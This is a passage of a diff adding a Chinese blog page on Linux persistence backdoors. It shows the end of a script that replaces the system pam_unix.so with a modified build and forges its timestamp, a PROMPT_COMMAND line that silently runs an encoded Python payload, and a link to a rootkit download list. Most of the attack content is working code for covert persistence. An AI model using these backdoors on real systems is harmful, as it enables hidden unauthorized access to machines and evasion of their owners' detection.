+<span class="k">fi</span>
+<span class="c1">#copy modified pam_unix.so</span>
+<span class="k">if</span> <span class="o">[</span> <span class="sb">`</span>uname -p<span class="sb">`</span> <span class="o">=</span> <span class="s1">&#39;x86_64&#39;</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
+<span class="nv">LIBPATH</span><span class="o">=</span>lib64
+<span class="k">else</span>
+<span class="nv">LIBPATH</span><span class="o">=</span>lib
+<span class="k">fi</span>
+/bin/cp -rf /<span class="nv">$LIBPATH</span>/security/pam_unix.so /<span class="nv">$LIBPATH</span>/security/pam_unix.so.bak <span class="c1">#.. .........</span>
+/bin/cp -rf modules/pam_unix/.libs/pam_unix.so /<span class="nv">$LIBPATH</span>/security/pam_unix.so
+touch -d <span class="s2">&#34;</span><span class="nv">$oldtime</span><span class="s2">&#34;</span> /lib/security/pam_unix.so
+<span class="nb">cd</span> .. <span class="o">&amp;&amp;</span> rm -rf Linux-PAM-1.1.1*
+<span class="nb">echo</span> <span class="s2">&#34;Done bro..&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以根据需要将下载pam部分修改为上传本地下载好的pam，这样可以避免目标主机无法访问对应链接地址时造成的文件下载失败。</p>
+<p>Linux PAM版本地址：<a href="http://www.linux-pam.org/library/">http://www.linux-pam.org/library/</a></p>
+<p>详细情况可参考<a href="https://blog.51cto.com/redkey/1343316">https://blog.51cto.com/redkey/1343316</a></p>
+<h3 id="5-prompt_command后门">5. PROMPT_COMMAND后门</h3>
+<p>bash提供来一个环境变量<code>PROMPT_COMMAND</code>，这个变量会在执行命令前执行一遍。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">export</span> <span class="nv">PROMPT_COMMAND</span><span class="o">=</span><span class="s2">&#34;lsof -i:1025 &amp;&gt;/dev/null || (python -c &#34;</span>exec<span class="o">(</span><span class="s1">&#39;encoded_payload&#39;</span>.decode<span class="o">(</span><span class="s1">&#39;base64&#39;</span><span class="o">))</span><span class="s2">&#34; 2&gt;/dev/null &amp;)&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>也可以使用该变量进行提权：<a href="https://www.anquanke.com/post/id/155943">https://www.anquanke.com/post/id/155943</a></p>
+<h3 id="7-rootkit">7. Rootkit</h3>
+<p>根据搜索情况来看，一般水平的rootkit很容易将系统环境搞崩，而高质量的Rootkit不太容易找，因此如非迫不得已，不是很建议直接使用这种方法。如果能单独进行定制，是另外一种情况。这里暂时先给出一个收集的rootkit库：<a href="https://github.com/d30sa1/RootKits-List-Download">https://github.com/d30sa1/RootKits-List-Download</a></p>
+<h2 id="参考文献">参考文献</h2>
+<ol>
+<li><a href="https://wiki.bash-hackers.org/howto/redirection_tutorial">https://wiki.bash-hackers.org/howto/redirection_tutorial</a></li>
+<li><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">https://www.gnu.org/software/bash/manual/html_node/Redirections.html</a></li>
+<li><a href="https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/">https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/</a></li>
+<li><a href="https://www.anquanke.com/post/id/171891#h2-15">https://www.anquanke.com/post/id/171891#h2-15</a></li>
+<li><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html</a></li>
+<li><a href="https://www.anquanke.com/post/id/155943#h2-9">https://www.anquanke.com/post/id/155943#h2-9</a></li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-12-13</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2020/12/Backdoor/" data-title="Linux下的权限维持" data-hashtags="Security"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2020/12/Backdoor/" data-hashtag="Security"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2020/12/Backdoor/" data-title="Linux下的权限维持"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2020/12/Backdoor/" data-title="Linux下的权限维持"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2020/12/Backdoor/" data-title="Linux下的权限维持" data-ralateuid="xxxx"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/security/">Security</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/11/JWT/" class="prev" rel="prev" title="JWT认证和攻击界面简单总结"><i class="fas fa-angle-left fa-fw"></i>JWT认证和攻击界面简单总结</a>
+            <a href="/2020/12/MBR/" class="next" rel="next" title="MBR简介">MBR简介<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.84.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank">v4ler1an</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
